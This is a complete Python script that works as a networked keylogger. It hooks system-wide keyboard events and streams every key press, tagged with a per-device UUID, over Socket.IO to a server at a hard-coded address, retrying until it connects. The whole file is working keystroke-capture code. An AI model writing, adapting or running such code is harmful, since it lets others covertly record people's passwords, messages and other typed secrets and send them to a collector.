import socketio
import keyboard
import uuid
import threading
import time

# Generate unique device ID
device_id = str(uuid.uuid4())  # You can store to disk to persist

# Connect to server with retry
sio = socketio.Client()

def connect_to_server():
    while True:
        try:
            print("[*] Trying to connect to server...")
            sio.connect("http://192.168.0.4:5000")
            print("[+] Connected to server!")
            break
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            print("[-] Retrying in 5 seconds...")
            time.sleep(5)

def send_key(key):
    if sio.connected:
        sio.emit("keypress", {"device_id": device_id, "key": key.name})
    else:
        print("[!] Not connected. Skipping key.")

def listen_keys():
    while True:
        key = keyboard.read_event()
        if key.event_type == keyboard.KEY_DOWN:
            send_key(key)
            if key.name == "esc":
                print("Exiting...")
                break

if __name__ == "__main__":
    connect_to_server()

    # Run key listener in background
    t = threading.Thread(target=listen_keys)
    t.daemon = True
    t.start()

    # Keep the program alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopped by user.")
